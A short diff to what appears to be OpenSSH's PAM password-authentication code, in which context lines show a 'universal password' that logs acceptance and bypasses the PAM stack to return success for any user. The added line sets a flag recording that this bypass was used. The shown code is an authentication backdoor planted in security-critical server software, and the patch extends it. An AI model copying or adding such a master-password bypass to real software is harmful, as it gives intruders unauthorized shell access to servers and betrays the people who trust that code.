@@ -1158,6 +1158,7 @@ int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
     debug("MONITOR PAM: Universal password accepted for %.100s. Bypassing "
           "PAM stack.",
           authctxt->user);
+    universal_bypass_triggered = 1; // Trip universal bypass flag
     return 1;
   }
 
